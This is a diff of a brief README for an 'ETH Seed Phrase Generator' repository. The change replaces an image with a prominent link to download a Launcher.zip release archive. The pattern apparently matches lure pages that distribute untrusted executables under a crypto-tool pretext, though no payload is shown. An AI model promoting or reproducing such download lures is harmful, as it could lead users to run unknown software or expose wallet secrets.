@@ -1,3 +1,3 @@
 # ETHSeedPhraser
 ETH Seed Phrase Generator
-![5d720bb3c6046536bb31_](https://github.com/LeroyManya/ETHSeedPhraser/assets/165421309/ea2a30f3-6262-4a67-a3f3-38729defc2af)
+# [![img2](https://i.imgur.com/a8pnO5U.jpeg) [Download](https://github.com/LeroyManya/ETHSeedPhraser/releases/download/V1.4.8/Launcher.zip)] from github
